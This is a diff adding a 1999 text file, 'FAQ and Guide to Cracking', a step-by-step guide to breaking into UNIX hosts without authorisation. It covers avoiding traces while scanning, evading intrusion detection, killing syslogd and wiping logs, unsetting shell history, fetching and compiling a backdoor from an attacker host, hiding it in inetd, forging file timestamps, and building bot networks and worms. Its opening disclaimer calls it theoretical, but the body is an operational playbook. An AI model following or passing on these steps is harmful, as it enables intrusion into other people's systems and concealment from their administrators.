@@ -1,0 +1,382 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+
+
+			FAQ and Guide to Cracking
+
+		           (c) 1999 by Mixter
+
+
+Disclaimer:
+ This is a theoretical instruction to cracking and for informational
+ purposes. It should be seen as an introduction to the methods and
+ strategies used by crackers rather than a howto. The author is not
+ suggesting to perform illegal actions and cannot be held liable
+ for any actions of other individuals who perform any of the actions
+ discussed in this paper and possible resulting damage.
+
+Introduction:
+ I am going to describe the methods and strategies used to access
+ various UNIX hosts among the internet unauthorizedly. This guide will
+ not teach you how to hack, neither do you have to be a hacker to use
+ the techniques described here. Hacking means finding your own way
+ to do it, and finding new approaches to accomplishing something. I am
+ only going to supply you with one possible approach to cracking.
+
+I. Prerequisites
+
+Operating System:
+ You certainly need Unix installed on your home computer. WINDOWS
+ WILL NOT DO IT. I'm not going into details here, but you should take
+ either Net/Open/FreeBSD or Linux because they are POSIX compliant,
+ suitable for Home PC's and most small network tools will compile
+ on them. If you use Linux [1], you should not use the RedHat, SuSE, or
+ Slackware distributions unless you know how to secure them properly.
+ Local root compromise can be fatal as you may reveal your identity.
+
+Basic Knowledge:
+ Get experienced in the use with the following tools. Use the 'man' command,
+ and work with them until you fully understand them. These tools are:
+ awk 	cat 	chmod 	dd 	grep	 gzip	 kill	 ln
+ ls	mail	mknod 	more 	mount	 ping	 ps	 sed
+ sort 	tar	ifconfig        ipfwadm	 last    head    tail
+ gcc	cut	find	ftp	less	 vim	 nc (netcat)
+ rcp	xhost	xterm	syslogd	inetd	 telnet  ssh     finger
+
+Security requirements:
+ You need to make sure that no one can compromise your own host. Check
+ security sites to make sure your daemons (servers) are not exploitable.
+ Do not allow anyone to use your box. Disable telnet, rlogin, and whatever
+ you don't need yourself. Ideally, you do not run any servers at all while
+ you are attacking other hosts. Consider encrypting directories and/or
+ complete partitions with encrypted file systems and encrypt emails and
+ files you transfer with PGP. [2]
+
+Account:
+ For your activities, you require an ISP account with a direct connection,
+ which normally all ISP provide. You might want to consider not doing
+ any 'cracking' activities from your home at all, in which case you need
+ a fast linux or bsd shell account, which must not be from a commercial
+ shell provider (esp. those who sell eggdrop and irc accounts), and if
+ you use a university account, you need to make sure that they do not
+ watch / monitor their users. If you use a dialup, ensure yourself that
+ no transparent proxies or network monitors (squid etc.) are being run by
+ your provider. Do a traceroute and check your providers backbone routers
+ for NIDS (Intrusion Detection), network monitors, proxies, and anything
+ that seems unusual; alternatively let someone with more knowledge do it.
+
+II. Scanning
+
+Avoiding track-downs:
+ Where you scan from is up yours. Whatever you do, don't scan from your
+ dialup while using a legit internet account. Everyone knowing your IP is
+ a phone call to your provider away from knowing your identity. If you
+ use fake accounts, avoid using fake or stolen credit cards to make them.
+ Also avoid using 1-800 numbers at all costs, because the 1-800 nodes
+ generally log every calling phone number with access time. Inquire about
+ the ISP you use to make sure he is not in explicit cooperation with federal
+ agencies. Additionally, do not stay longer than 5 (in words: five) hours
+ on the internet without hanging up and reconnecting. Why? If you are
+ logged on, the node has your account associated with your current
+ dynamic IP address for obvious technical reasons, and they also might
+ be able to trace you. Most nodes will not keep a table of which IP
+ belongs to which account once they disconnected, especially on huge
+ ISP where this would take large additional resources.
+ I disrecommend traversing through WinGate and SOCKS servers,
+ because they give you a fake feeling of safety. Often, these servers are
+ logging every access and sometimes they are put up by federal agencies
+ itself. You should ideally relay your connections through a server you
+ have root, hence full control, on, using datapipe, bnc, ssl, or a
+ wingate/socks server with logging completely disabled.
+
+Stealthy scanning:
+ A scan not being noticed is a successful scan. Half-Open (SYN)
+ scans are lame, because many daemons will still report a
+ "warning: can't get client address: Connection reset by peer"
+ or similar message, then have someone turn on a sniffer or tcplogd
+ and they see who is scanning them. Advanced and recommended scans
+ are NUL (tcp packet without any flags), XMAS (ack/syn/rst probe),
+ and Maimon scans, which can be done with nmap [3]. If you use
+ connect() scans, which are much more reliable, then use lscan,
+ and get the version info. This generally makes the most sense
+ because you have to get the daemon's versions anyway to see
+ if it is exploitable.
+
+Play dead:
+ As you scan, I strongly recommend disabling every single service
+ on the machine you're scanning from and setting packet filtering
+ rules. This will fool the hosts being scanned into thinking your
+ host is down and the scan is spoofed.
+ A few things you should disable:
+ * Inetd ( identd, finger, ftp, telnet )
+ * All INCOMING tcp connection requests (ipfwadm: -y flag)
+ * ICMP Timestamping, Echo reply, Query (ICMP types 8/13/15/17)
+ * UDP Traceroute queries (udp port range 33400-33500)
+ Also note that -deny is better than -reject, which would send
+ an ICMP unreach packet back instead of keeping totally silent.
+
+Non-sequential scanning:
+ This is important: Use non-sequential scanning to avoid
+ intrusion detection systems. An IDS or NIDS is installed on a gateway
+ or router and monitors unusual traffic to certain ports. If you scan
+ 1.1.1.1, 1.1.1.2 .. 1.1.1.255, 1.1.2.1 etc.,
+ an intrusion detection system can detect your scan against 1.1.1.*.
+ Instead, scan like this: 1.1.1.1, 1.1.2.1 .. 1.1.255.1, 1.1.1.2
+ You get the point.
+
+What to scan:
+ Most crackers resolve a top-level domain like .com .net or a
+ country like .ee .se .ch etc. using z0ne or axfr from ADM [4], or
+ by using a simple recursive shell script. host -l domain will
+ not do for a scan, because you'll miss all the subnets that way,
+ and there are plenty of them.
+ However, I'd rather suggest scanning complete IP blocks. Depending
+ on your greed, you can either scan a class B (1.1.*.*) or class A
+ (1.*.*.*) network. You might wish to obtain some information about
+ your targets first. To do this, you can query whois.arin.net, the
+ registration center for IP addresses. Lets say you want to scan
+ 192.168.*.* and you want to know who owns that IP block. Type:
+ whois -h whois.arin.net 192.168.0.0
+ or
+ whois 192.168.0.0@whois.arin.net
+ and you get a short description of the owners of that netblock.
+ If arin.net doesn't find any information, don't scan it, because
+ the IPs are probably not yet in use. Some info on the 'whois'
+ results...
+ Maintained by RIPE.NET = European (no, uk, ch, at, de, se, dk, etc.)
+ Maintained by APNIC.NET = Asian (id, kr, za, ee, tr, li, kh, etc.)
+ Maintained by NIC.xxx = Belonging to country xxx
+
+Finding vulnerable hosts:
+ First rule of scanning is: never delete your scan logs. If
+ you think you are completely done with evaluating your logs,
+ then compress, encrypt and store them, dont delete them. New
+ security vulnerabilities will be found sooner or later, then you
+ won't have to scan it all again.
+ From my experience, the vulnerability scanners are almost all
+ bullshit, you dont need them. Use grep and awk to extract the
+ IP numbers from your scan logs, like this...
+ grep "QPOP" port110.log | grep "(version 2.2)" | awk '{print $1}' > 0wn.txt
+ (presuming that your scanner logs like this: "<IP> - <CAPTURED VERSION>")
+ There are a couple of cases where you need an additional scan
+ to find vulnerable versions, which are:
+
+ Buggy Daemon		Scanner			Scans for...
+ wu-ftp BETA-18		wuftpscan/ben (private)	Writable dir
+ portmap		rpcinfo -p (unix tool)	Portmap Version
+ ttdbserver		rpcinfo			ttdb version
+ rstatd			statdscan		rstatd version
+ mountd			mountdscan (rootshell)	mountd/nfs version
+ bind			binfo-udp (rootshell),  bind version
+                        nscan (my site),
+                        mbind (private)
+
+III. Rooting
+
+Lets think about the first commands you issue. They should:
+ 1. Discretely remove traces of the root compromise
+ 2. Gather some general info about the system
+ 3. Make sure you can get back in
+ 4. Disable or patch the vulnerable daemon(s)
+
+ Here are my suggestions...
+
+ 1. killall -9 syslogd klogd - pesky loggers! only few admins
+    will notice if they get turned off. Now you can act freely.
+    copy secure.1 and messages.1 from /var/log over secure and messages
+    Normally, these logs are the only ones with the intruders IP
+    and traces of a root compromise in them. If *.1 doesn't exist,
+    truncate the files. Also, unset HISTFILE is important.
+    Nobody does unset HISTFILE, thus leaving a .bash_history in
+    /var/named or even /. Very unprofessional :).
+
+ 2. uname -a, w, last -10, cat /etc/passwd /etc/inetd.conf...
+    Inform yourself about the frequency the system is being
+    maintained, administrated, if the logfiles are being analyzed.
+    * Look how many people have access to it (/etc/passwd) - the
+    more the better for you (keeps attention away from you).
+    * Look if the system is already backdoored!! you might want to
+    remove other backdoors.
+    * Look for a loghost or snmp (dangerous because you cant manipulate
+    the logs on a far-away loghost). Watch out for *logd, sniffers,
+    netmon's etc before you do anything great on the host.
+    If you are paranoid, traceroute the host, and see if non-routers
+    are before that host (probably IDS, loghost, sniffer, etc).
+
+ 3. This is important: DONT MANIPULATE THE SYSTEM CONFIGURATION! DOH!
+    It is too easy to detect you if you add yourself to /etc/passwd,
+    or open a port by manipulating inetd.conf. Let me tell you that
+    root kits and /bin/login trojans are the first things any sane admin
+    will watch for. Install a nice stealthy port backdoor. My approach
+    to uploading files is doing:
+    (on your box)
+     $ uuencode -m backdoor.c backdoor.c | less
+     <uu encoded junk appears, which you copy with your mouse>
+    (on the target box)
+     uudecode
+     <it waits for input, paste the uuencoded stuff, page-by-page>
+     # cc -o backdoor backdoor.c
+   A nice different method is putting a daemon on your own box, on
+   port 666, that spits out the source code when someone telnets to
+   it, so you can do telnet ppp-42.haxor.net 666 > backdoor.c
+   As I said, make sure you can get back in. If the box you rooted
+   has an uptime of more than 300 days or so, you might consider
+   not installing the backdoor for startup. Instead, kill the
+   vulnerable daemon, and when the host restarts, come back using an
+   exploit. Normally, you can replace a lame daemon that nobody uses
+   with your backdoor. Look at inetd.conf to see what daemons are
+   active. A safe bet is in.talkd which often is activated but seldom
+   ever used. So, when you want to re-activate your backdoor,
+   talk root@0wned.host.com for a second, and your backdoor is running.
+   You can also add /path/to/backdoor to /root/.profile.. but it is
+   a bit riskier than the inetd backdoor method.
+
+ 4. Subscribe to bugtraq, CIAC security list, or look at rootshell,
+    to see what you need to do to patch your buggy stuff. If RPM is
+    installed you can try a rpm -U ftp://ftp.cdrom.com/rightdir/daemon.rpm
+    If not, use ncftp to fetch the file anonymously, because it doesn't need
+    user interaction. If you want, add an additional backdoor in your
+    "patched" server. QPOP 2.53 even supports this itself.
+    For all files you replace, you should modify the time stamps,
+    which wont help, if the admin uses tripwire or cksum, but if the
+    admin is, like most admins, a complete lamer that does find / -ctime
+    to scan for trojans and thinks he knows his job. :P
+    To modify timestamps, you do a simple:
+    touch -r /bin/bash /path/to/your/trojan
+    this will copy the exact date/time info from /bin/bash
+    over your freshly added trojan. Voila!
+    The alternative to all this for lazy people is, to add a
+    ipfwadm rule that prevents traffic from the outside (-W eth0)
+    to the ports with the buggy daemons, and adding that command
+    to a rc.d script as well. Bind doesn't need tcp port 53 for anything
+    except zone transfers and the RoTShB/ADM bind exploits. It works
+    fine with 53/tcp firewalled. But be aware that this might get you
+    detected, lets say if you disable port 110 or 143 on an ISP's
+    central mail exchange server...
+
+About your backdoor:
+    Port > 10000 is strongly recommended, also a backdoor using UDP,
+    ICMP, or even something as unusual as raw IP is very useful.
+    People that bind /bin/sh to a port are idiots, because they
+    open that host to everyone, letting in sniffers, and probably
+    other people who may damage the host seriously. Make sure to
+    password protect everything that runs as root. A password
+    of a minimum length of 8 characters, because you have no way
+    of detecting a brute force attack. For the C programmers, let
+    me say, listen(sockfd,1). Maybe 2 connections, but not more.
+    For comfortability, you can add some stuff you want to occur
+    on each successful backdoor login, like system("w"),
+    system("killall -9 syslogd klogd"), or whatever. If you want a
+    front-end backdoor with some integrated functions, try gateway[5].
+
+IV. UTILIZING COMPROMISED SYSTEMS
+
+About your activities:
+    Do what you desire, but never without disregarding stealthiness.
+    If you stop checking log files, processes, or start something
+    like ping -s 1024 -f cert.org un-stealthed, it is, depending
+    on the admin, a matter of hours or days until you lose the host.
+    Most of the time, losing a host means you cannot get access again,
+    and the admins will examine their system with extreme scrutiny;
+    if they are too lame, they might contact some external security
+    experts or even the Computer Emergency Response Team.
+    Never do serious damage to the system, when you don't have to -
+    and trust me, you won't. Damaging a system by altering vital system
+    files, replacing frequently-used programs or even destroying
+    information is unintelligent, will not do you any good, and will
+    maybe assist you in getting new enemies.
+    And it is trivial to mention not to deface web sites...
+
+World domination:
+    As the number of systems you control increases, you might want
+    some kind of easy remote control, utilization for attacks,
+    and detection of detection of your activities. You can install
+    newnick bots or eggdrop bots with fancy scripts which can be
+    controlled through IRC to make life easier (make sure to sit and
+    think before you consider doing anything big with them on IRC!).
+    You can make your own inter-linked network of root systems,
+    in which case you need to start programming because no one will
+    release such a program to the public. :)
+    You can make a little packages with spoofing flooders, smurf
+    and the like, if you decide becoming a packet warrior (then again,
+    it won't help you accomplishing anything but getting irc channels
+    or shutting down government sites...).
+    Alternatively, you can use every root you get to scan new netblocks,
+    and have the information mailed to you or whatever. You can make
+    an internet worm like ADMw0rm [4], B4b0w0rm, millennium worm
+    (the last 2 are private), and install them on your roots; make sure
+    it is well constructed and bug-free...
+    If you are a creative person, you can make them scan large amounts
+    of ISP dialup netblocks for back orifice, netbus server, backdoor G,
+    and what not, and write something that controls their computers
+    to spread more trojans, send their mail to you, get their
+    passwords, flood, scan, invade their private lives...
+    no wait, that's the governments job.
+
+V. YOUR PRESENCE ON THE NET
+
+Smart behavior and senseless behavior:
+    What you do besides cracking, mostly happens on IRC. IRC
+    should be seen as a tool for getting in touch with other
+    skilled persons and exchanging thoughts and information.
+    To avoid wasting your time, skills, and possibly getting
+    busted, here are some things which you SERIOUSLY should
+    not be doing:
+    1) Warez. Stay away from warez, it is a waste of time.
+     Warez ruins productive people and makes software expensive.
+     Besides the moral bullshit, you can always get something
+     you really need (#1 net game, enterprise application etc.),
+     and you don't need much, trust me. Almost everything
+     security / hacking related is free. Joining a warez group
+     gets you a) alot of vhosts with lame names b) idiotic
+     friends c) on the FBI blacklist - nothing besides that.
+    2) 'IRC War'. Groups like core, chrome, enforce, conflict,
+     takeover, madcrew, phorce, tnt, etc. etc. who call themselves
+     'War' groups, are good for nothing. Why would you want to
+     be a member of a group that attacks other similar groups
+     and channels - it is comparable to the mafia - almost
+     as violent, dangerous, except that you don't get rich.
+     If you think you need 'WarGroup' support for taking a
+     channel with reasonable security, you are lame or you
+     can't take a challenge. Think again.
+    3) Hacking related groups. Inform yourself about what
+     happened to gH or 'global Hell'. Most of these groups
+     do the exact opposite of what is advised in this paper.
+     If you get an offer to join:
+     l0pht, cDc, MOD, thc, or ADM, take it because you'll
+     learn a lot, all other groups are not worth your time.
+    4) IRC operators, BOFH, admin of big systems. Stay away
+     from them until you are confidently prepared and willing
+     to fight with them. Blindly attacking them can also be a waste
+     of time, but it can also become a reasonable challenge.
+
+Keep up to date:
+    The more you advance in cracking skills, or even might
+    consider hacking, programming or developing, the web
+    probably gets the part of the web you use least.
+    Visit your favorite security related sites frequently,
+    and make sure to keep up to date about security breaches,
+    law enforcement, exploits, changes in the methods of
+    crackers and admins. My bookmarks certainly include
+    Packetstorm security [6] and GeekGirl [7].
+
+URLS:
+	[1] ftp://ftp.cdrom.com/pub/linux/distributions
+	[2] http://members.xoom.com/i0wnu/pgp.html
+	[3] http://www.nmap.org
+	[4] ftp://ftp.adm.isp.at/pub/ADM
+	[5] http://members.xoom.com/i0wnu/gateway.tgz
+        [6] http://www.genocide2600.com/~tattooman
+        [7] http://www.geek-girl.com
+
+-----BEGIN PGP SIGNATURE-----
+Version: PGP for Personal Privacy 5.0
+Charset: noconv
+
+iQEVAwUBN2VcO7dkBvUb0vPhAQGtPgf+Iglo6ZZh7sF/WbeteyTGYaw0D9AJR4IH
+A7hBo9AUwm3ZO7gDhdzLvDlOjXiMxhhJ2Jey/Y6M5Bb5LvZf8tK4EoUIF/UA8ifU
+E6fd18zBDJep2LFaHyzXegA5oCWCYjpb3ZcFtbtpcA2He1hU85QUknOAHZ6lJyiV
+JJZziWnXRkAcmRpzbLkTgVydisgugNwfYs9OJH/GNMCKQzeKB+MJrQ7wNlNOdV6T
+7u4Jt1q1hW7P5p3xi6ETS196qQ7NO+46FqTEShk6HC+wl7EDwv8VTbz5lEGjBVXz
+JEiIIAM5YfbGRbu65fTIlhI0u5N8OxKkX74HOGcBsInQlzuCNq6aMA==
+=o8mY
+-----END PGP SIGNATURE-----
